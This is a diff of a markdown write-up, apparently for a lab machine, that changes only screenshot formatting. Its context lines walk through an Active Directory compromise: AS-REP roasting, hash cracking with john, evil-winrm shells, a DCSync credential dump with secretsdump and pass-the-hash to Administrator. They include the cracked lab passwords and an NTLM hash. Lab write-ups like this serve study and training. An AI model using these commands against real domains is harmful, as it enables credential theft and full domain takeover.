@@ -23,8 +23,7 @@ A full TCP scan revealed a classic Windows Active Directory environment, includi
 
 The presence of Kerberos, LDAP, and SMB immediately suggested that Active Directory attacks would be the primary focus rather than pure web exploitation.
 
-> 📸 **Screenshot:** Nmap scan results  
-> `![Nmap scan](.github/screenshots/nmap.webp)`
+![Nmap scan](.github/screenshots/nmap.webp)
 
 ---
 
@@ -39,8 +38,7 @@ Browsing port 80 revealed a static banking website with several informational se
 
 The **About** page was especially valuable, as it leaked employee names that could be converted into potential domain usernames.
 
-> 📸 **Screenshot:** Names exposed on website  
-> `![Employees list](.github/screenshots/exposedusers.webp)`
+![Employees list](.github/screenshots/exposedusers.webp)
 
 ---
 
@@ -55,8 +53,7 @@ Using the employee names, I generated a wordlist with common Active Directory na
 
 This list was later used for Kerberos-based attacks.
 
-> 📸 **Screenshot:** Custom username list  
-> `![Username list](.github/screenshots/customusers.webp)`
+![Username list](.github/screenshots/customusers.webp)
 
 ---
 
@@ -70,8 +67,7 @@ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users -dc-ip $IP
 
 This successfully returned a Kerberos hash for the user `fsmith`.
 
-> 📸 **Screenshot:** AS-REP roastable user identified  
-> `![AS-REP roast](.github/screenshots/asrepcheck.webp)`
+![AS-REP roast](.github/screenshots/asrepcheck.webp)
 
 ---
 
@@ -89,8 +85,7 @@ john hashes --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
 fsmith : Thestrokes23
 ```
 
-> 📸 **Screenshot:** Password cracked with John  
-> `![John result](.github/screenshots/johncrack.webp)`
+![John result](.github/screenshots/johncrack.webp)
 
 ---
 
@@ -108,8 +103,7 @@ After confirming access, I obtained an interactive shell:
 evil-winrm -i $IP -u fsmith -p 'Thestrokes23'
 ```
 
-> 📸 **Screenshot:** Evil-WinRM shell as `fsmith`  
-> `![Evil-WinRM fsmith](.github/screenshots/fsmithwinrm.webp)`
+![Evil-WinRM fsmith](.github/screenshots/fsmithwinrm.webp)
 
 ---
 
@@ -127,8 +121,7 @@ svc_loanmgr : Moneymakestheworldgoround!
 
 This immediately suggested credential reuse or delegated privilege abuse.
 
-> 📸 **Screenshot:** AutoLogon credentials discovered by WinPEAS  
-> `![WinPEAS autologon](.github/screenshots/autologon.webp)`
+![WinPEAS autologon](.github/screenshots/autologon.webp)
 
 ---
 
@@ -147,8 +140,7 @@ BloodHound analysis revealed that `svc_loanmgr` possessed the following permissi
 
 These permissions allow **DCSync** attacks, effectively enabling the account to impersonate a Domain Controller.
 
-> 📸 **Screenshot:** BloodHound outbound object control view  
-> `![BloodHound perms](.github/screenshots/bloodhoundprivs.webp)`
+![BloodHound perms](.github/screenshots/bloodhoundprivs.webp)
 
 ---
 
@@ -162,8 +154,7 @@ impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgorou
 
 This dumped domain password hashes, including the **Administrator** account.
 
-> 📸 **Screenshot:** Secretsdump output  
-> `![Secretsdump output](.github/screenshots/secretsdump.webp)`
+![Secretsdump output](.github/screenshots/secretsdump.webp)
 
 ---
 
@@ -177,8 +168,7 @@ evil-winrm -i $IP -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
 
 This resulted in full **Domain Admin** access.
 
-> 📸 **Screenshot:** Evil-WinRM shell as Administrator  
-> `![Evil-WinRM admin](.github/screenshots/adminwinrm.webp)`
+![Evil-WinRM admin](.github/screenshots/adminwinrm.webp)
 
 ---
 
